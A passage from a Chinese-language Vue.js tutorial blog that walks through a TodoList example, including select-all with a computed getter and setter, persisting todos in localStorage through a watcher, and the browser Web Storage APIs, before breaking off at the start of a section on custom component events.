v-show&#x3D;&quot;totalDone&quot;&gt;<br>    &lt;label&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;isAll&quot; @change&#x3D;&quot;checkAll&quot; &#x2F;&gt;<br>      &lt;!-- &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt; --&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;span&gt;<br>      &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span<br>    &gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot;&gt;清除已完成任务&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoFooter&quot;,<br>  props: [&quot;todos&quot;, &quot;checkAllTodo&quot;],<br>  computed: &#123;<br>    totalDone() &#123;<br>      return this.todos.reduce((pre, todo) &#x3D;&gt; &#123;<br>        return pre + (todo.done ? 1 : 0);<br>      &#125;, 0);<br>    &#125;,<br>    isAll() &#123;<br>      return this.totalDone &#x3D;&#x3D;&#x3D; this.todos.length &amp;&amp; this.totalDone &gt; 0;<br>    &#125;,<br>  &#125;,<br>  methods: &#123;<br>    checkAll(event) &#123;<br>      this.checkAllTodo(event.target.checked);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList<br>          :todos&#x3D;&quot;todos&quot;<br>          :checkTodo&#x3D;&quot;checkTodo&quot;<br>          :deleteTodo&#x3D;&quot;deleteTodo&quot;<br>        &gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter :todos&#x3D;&quot;todos&quot; :checkAllTodo&#x3D;&quot;checkAllTodo&quot;&gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: [<br>        &#123; id: &quot;001&quot;, title: &quot;吃饭&quot;, done: true &#125;,<br>        &#123; id: &quot;002&quot;, title: &quot;睡觉&quot;, done: false &#125;,<br>        &#123; id: &quot;003&quot;, title: &quot;打游戏&quot;, done: true &#125;,<br>      ],<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getAdd(Obj) &#123;<br>      &#x2F;&#x2F; 添加一个代办<br>      this.todos.unshift(Obj);<br>    &#125;,<br>    checkTodo(id) &#123;<br>      &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done;<br>      &#125;);<br>    &#125;,<br>    deleteTodo(id) &#123;<br>      &#x2F;&#x2F; 删除一个代办事项<br>      this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123;<br>        return todo.id !&#x3D;&#x3D; id;<br>      &#125;);<br>    &#125;,<br>    checkAllTodo(done) &#123;<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        todo.done &#x3D; done;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<h5 id="v-model实现-1"><a href="#v-model实现-1" class="headerlink" title="v-model实现"></a>v-model实现</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923200541037.png" srcset="/img/loading.gif" lazyload alt="image-20210923200541037" style="zoom:80%;" />

<p>问题产生原因：<code>isAll</code>是一个计算属性，下面的写法要求<code>isAll</code>只被读取，不会直接被修改。但是对底部勾选后会全选，那么势必会修改<code>isAll</code></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923201002203.png" srcset="/img/loading.gif" lazyload alt="image-20210923201002203" style="zoom:80%;" />

<p><code>App.vue</code> 添加删除已选事项功能</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;todo-footer&quot; v-show&#x3D;&quot;totalDone&quot;&gt;<br>    &lt;label&gt;<br>      &lt;!-- &lt;input type&#x3D;&quot;checkbox&quot; :checked&#x3D;&quot;isAll&quot; @change&#x3D;&quot;checkAll&quot; &#x2F;&gt; --&gt;<br>      &lt;input type&#x3D;&quot;checkbox&quot; v-model&#x3D;&quot;isAll&quot; &#x2F;&gt;<br>    &lt;&#x2F;label&gt;<br>    &lt;span&gt;<br>      &lt;span&gt;已完成&#123;&#123; totalDone &#125;&#125;&lt;&#x2F;span&gt; &#x2F; 全部 &#123;&#123; todos.length &#125;&#125;&lt;&#x2F;span<br>    &gt;<br>    &lt;button class&#x3D;&quot;btn btn-danger&quot; @click&#x3D;&quot;clearAll&quot;&gt;清除已完成任务&lt;&#x2F;button&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  name: &quot;TodoFooter&quot;,<br>  props: [&quot;todos&quot;, &quot;checkAllTodo&quot;, &quot;clearAllTodos&quot;],<br>  computed: &#123;<br>    totalDone() &#123;<br>      return this.todos.reduce((pre, todo) &#x3D;&gt; &#123;<br>        return pre + (todo.done ? 1 : 0);<br>      &#125;, 0);<br>    &#125;,<br>    isAll: &#123;<br>      get() &#123;<br>        return this.totalDone &#x3D;&#x3D;&#x3D; this.todos.length &amp;&amp; this.totalDone &gt; 0;<br>      &#125;,<br>      set(value) &#123;<br>        this.checkAllTodo(value);<br>      &#125;,<br>    &#125;,<br>  &#125;,<br>  methods: &#123;<br>    clearAll() &#123;<br>      this.clearAllTodos();<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<p>由于这里并没有修改<code>props</code>传入的数据，而是绑定自身的一个计算属性，所以完全没有问题。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923203255201.png" srcset="/img/loading.gif" lazyload alt="image-20210923203255201" style="zoom:80%;" />

<h4 id="3-10-8-案例总结"><a href="#3-10-8-案例总结" class="headerlink" title="3.10.8 案例总结"></a>3.10.8 案例总结</h4><ul>
<li>组件化编码流程<ul>
<li>拆分静态组件：组件要按照功能点拆分，命名不要和<code>html</code>元素冲突</li>
<li>实现动态组件：考虑好数据存储位置，数据是一个组件在用还是一些组件在使用<ul>
<li>一个组件在用：放在组件自身即可</li>
<li>多个组件在使用，放在它们共同的父组件上（状态提升）</li>
</ul>
</li>
<li>实现交互：从绑定事件开始</li>
</ul>
</li>
<li><code>props</code>适用于：<ul>
<li>父组件 ===&gt; 子组件    通信</li>
<li>子组件 ===&gt; 父组件    通信（要求父先给子一个函数）</li>
</ul>
</li>
<li>使用<code>v-model</code>时要切记：<code>v-model</code>绑定的值不能是<code>props</code>传入的值，因为<code>props</code>是不可以修改的！</li>
<li><code>props</code>传过来的若是对象类型的数据，修改对象中的属性值时不会报错，但是不推荐这样做。</li>
</ul>
<h3 id="3-11-浏览器本地存储"><a href="#3-11-浏览器本地存储" class="headerlink" title="3.11 浏览器本地存储"></a>3.11 浏览器本地存储</h3><p>不是<code>Vue</code>特有的，原本<code>JS</code>中就有该功能，所以完全可以在<code>html</code>文件中书写。</p>
<p>借助本地存储实现（后续由唯品会测试，淘宝貌似加密了）：<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205136890.png" srcset="/img/loading.gif" lazyload alt="image-20210923205136890" style="zoom:80%;" /></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205241221.png" srcset="/img/loading.gif" lazyload alt="image-20210923205241221" style="zoom:67%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923205656055.png" srcset="/img/loading.gif" lazyload alt="image-20210923205656055"></p>
<hr>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//传入参数分别为key / value，且必须都是字符串，输入数值会被转换为字符串，只要不是字符串，默认调用toString</span><br><span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&#x27;person&#x27;</span>, zhul)<br><br><span class="hljs-comment">// 和zhul.toString()效果一样</span><br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923210434659.png" srcset="/img/loading.gif" lazyload alt="image-20210923210434659" style="zoom:80%;" />

<p>解决：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&#x27;person&#x27;</span>, <span class="hljs-built_in">JSON</span>.stringify(zhul))<br></code></pre></td></tr></table></figure>

<p><code>localStorage</code>：关闭浏览器后仍然有效，用户主动清空缓存就会被删除</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>localStorage<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;saveData()&quot;</span>&gt;</span>点我保存数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;readData()&quot;</span>&gt;</span>点我读取数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;deleteData()&quot;</span>&gt;</span>点我删除数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;clearData()&quot;</span>&gt;</span>点我清空数据<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">let</span> zhul = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张加林&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> &#125;</span><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveData</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;miketaylor&#x27;</span>)</span><br><span class="javascript">            <span class="hljs-comment">//传入参数分别为key / value，且必须都是字符串，输入数值会被转换为字符串</span></span><br><span class="javascript">            <span class="hljs-built_in">localStorage</span>.setItem(<span class="hljs-string">&#x27;person&#x27;</span>, <span class="hljs-built_in">JSON</span>.stringify(zhul))</span><br><br>        &#125;<br><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readData</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-keyword">let</span> result = <span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;person&#x27;</span>)</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">JSON</span>.parse(result))</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">localStorage</span>.getItem(<span class="hljs-string">&#x27;no exists&#x27;</span>));  <span class="hljs-comment">// 不存在返回null</span></span><br>        &#125;<br><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteData</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">localStorage</span>.removeItem(<span class="hljs-string">&#x27;name&#x27;</span>)</span><br>        &#125;<br><br><span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearData</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">localStorage</span>.clear()</span><br>        &#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>sessionStorage</code>：所有的API和<code>localStorage</code>相同，关闭浏览器后就会被清空</p>
<h4 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p><code>webStorage</code>、</p>
<ul>
<li><p>浏览器通过<code>Windows.sessionStorage</code>和<code>Windows.localStorage</code>属性来实现本地存储机制</p>
</li>
<li><p>存储内容大小一般支持5MB左右（不同浏览器可能不同）</p>
</li>
<li><p>相关API</p>
<ul>
<li><pre><code class="js">xxxxxxStorage.setItem(&#39;key&#39;,&#39;value&#39;);
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  该方法接收一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值<br><br>* ```js<br>  xxxxxxStorage.getItem(&#x27;person&#x27;)<br></code></pre></td></tr></table></figure>

该方法接收一个键名作为参数，返回键名对应的值
</code></pre>
</li>
<li><pre><code class="js">xxxxxxStorage.remove(&#39;key&#39;)
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>  该方法接收一个键名作为参数，并将该键名从存储中删除<br><br>* ```js<br>  xxxxxStorage.clear()<br></code></pre></td></tr></table></figure>

该方法会清空存储中的所有数据
</code></pre>
</li>
</ul>
</li>
<li><p>备注：</p>
<ul>
<li><code>sessionStorage</code>存储的内容会随着浏览器的关闭而消失</li>
<li><code>localStorage</code>存储的内容，需要手动清除才会消失<ul>
<li>调用API</li>
<li>清空浏览器缓存</li>
</ul>
</li>
<li><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的<code>value</code>获取不到，那么<code>getItem</code>的返回值是<code>null</code></li>
<li><code>JSON.parse(null)</code>的结果依然是<code>null</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="TodoList本地存储实现"><a href="#TodoList本地存储实现" class="headerlink" title="TodoList本地存储实现"></a>TodoList本地存储实现</h4><p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div id&#x3D;&quot;root&quot;&gt;<br>    &lt;div class&#x3D;&quot;todo-container&quot;&gt;<br>      &lt;div class&#x3D;&quot;todo-wrap&quot;&gt;<br>        &lt;TodoHeader :getAdd&#x3D;&quot;getAdd&quot;&gt;&lt;&#x2F;TodoHeader&gt;<br><br>        &lt;TodoList<br>          :todos&#x3D;&quot;todos&quot;<br>          :checkTodo&#x3D;&quot;checkTodo&quot;<br>          :deleteTodo&#x3D;&quot;deleteTodo&quot;<br>        &gt;&lt;&#x2F;TodoList&gt;<br><br>        &lt;TodoFooter<br>          :todos&#x3D;&quot;todos&quot;<br>          :checkAllTodo&#x3D;&quot;checkAllTodo&quot;<br>          :clearAllTodos&#x3D;&quot;clearAllTodos&quot;<br>        &gt;&lt;&#x2F;TodoFooter&gt;<br>      &lt;&#x2F;div&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>import TodoFooter from &quot;.&#x2F;components&#x2F;TodoFooter.vue&quot;;<br>import TodoHeader from &quot;.&#x2F;components&#x2F;TodoHeader.vue&quot;;<br>import TodoList from &quot;.&#x2F;components&#x2F;TodoList.vue&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; TodoFooter, TodoHeader, TodoList &#125;,<br>  data() &#123;<br>    return &#123;<br>      todos: JSON.parse(localStorage.getItem(&quot;todos&quot;)),<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getAdd(Obj) &#123;<br>      &#x2F;&#x2F; 添加一个代办<br>      this.todos.unshift(Obj);<br>    &#125;,<br>    checkTodo(id) &#123;<br>      &#x2F;&#x2F; 勾选 &#x2F; 取消勾选一个待办事项<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        if (todo.id &#x3D;&#x3D;&#x3D; id) todo.done &#x3D; !todo.done;<br>      &#125;);<br>    &#125;,<br>    deleteTodo(id) &#123;<br>      &#x2F;&#x2F; 删除一个代办事项<br>      this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123;<br>        return todo.id !&#x3D;&#x3D; id;<br>      &#125;);<br>    &#125;,<br>    checkAllTodo(done) &#123;<br>      &#x2F;&#x2F; 全选或全不选<br>      this.todos.forEach((todo) &#x3D;&gt; &#123;<br>        todo.done &#x3D; done;<br>      &#125;);<br>    &#125;,<br>    clearAllTodos() &#123;<br>      &#x2F;&#x2F; 清除所有已经完成的Todos<br>      this.todos &#x3D; this.todos.filter((todo) &#x3D;&gt; &#123;<br>        return !todo.done;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>  watch: &#123;<br>    todos(value) &#123;<br>      localStorage.setItem(&quot;todos&quot;, JSON.stringify(value));<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;&#x2F;script&gt;<br></code></pre></td></tr></table></figure>

<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923214057164.png" srcset="/img/loading.gif" lazyload alt="image-20210923214057164" style="zoom:80%;" />

<p>因为最开始使用时，本地缓存中没有<code>todos</code>项，则为<code>null</code>，将<code>null</code>传给<code>footer</code>，<code>footer</code>使用<code>length</code>计算长度，但是<code>null</code>上没有<code>length</code>属性，就会报错。</p>
<p>解决：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923214503467.png" srcset="/img/loading.gif" lazyload alt="image-20210923214503467" style="zoom:80%;" />

<hr>
<p>刷新会导致已经勾选的已经完成的勾选状态丢失。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/55.gif" srcset="/img/loading.gif" lazyload alt="55" style="zoom:80%;" />

<p>解决：使用深度监视</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210923215520566.png" srcset="/img/loading.gif" lazyload alt="image-20210923215520566" style="zoom:80%;" />

<h3 id="3-11-组件自定义事件"><a href="#3-11-组件自定义事件" class="headerlink" title="3.11 组件自定义事件"></a>3.11 组件自定义事件</h3><h4 id="3-11-1-绑定自定义事件"><a href="#3-11-1-绑定自定义事件" class="headerlink" title="3.11.1 绑定自定义事件"></a>3.11.1 绑定自定义事件</h4><img src="C:/Users/LEGION/AppData/Roaming/Typora/typora-user-images/image-20210924170432116.png" srcset="/img/loading.gif" lazyload alt="image-20210924170432116" style="zoom:80%;" />

<p>分别使用父组件传递函数给子组件和自定义事件实现子组件向父组件传递数据。</p>
<p><code>App.vue</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div class&#x3D;&quot;demo&quot;&gt;<br>    &lt;h2&gt;&#123;&#123; msg &#125;&#125;&lt;&#x2F;h2&gt;<br><br>    &lt;!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 --&gt;<br>    &lt;Student :getStudentName&#x3D;&quot;getStudentName&quot; &#x2F;&gt;<br>    &lt;hr &#x2F;&gt;<br><br>    &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （写法一：使用@或v-on）--&gt;<br>    &lt;!-- &lt;School v-on:miketaylor&#x3D;&quot;getSchoolName&quot; &#x2F;&gt; --&gt;<br><br>    &lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子向父传递数据 （第二种写法，使用ref，灵活性更强）--&gt;<br>    &lt;School ref&#x3D;&quot;school&quot;&gt;&lt;&#x2F;School&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import Student from &quot;.&#x2F;components&#x2F;Student&quot;;<br>import School from &quot;.&#x2F;components&#x2F;School&quot;;<br><br>export default &#123;<br>  name: &quot;App&quot;,<br>  components: &#123; Student, School &#125;,<br>  data() &#123;<br>    return &#123;<br>      msg: &quot;你好鸭&quot;,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    getStudentName(StudentName) &#123;<br>      console.log(&quot;学生姓名为：&quot;, StudentName);<br>    &#125;,<br>    getSchoolName(SchoolName) &#123;<br>      console.log(&quot;学校名称为：&quot;, SchoolName);<br>    &#125;,<br>  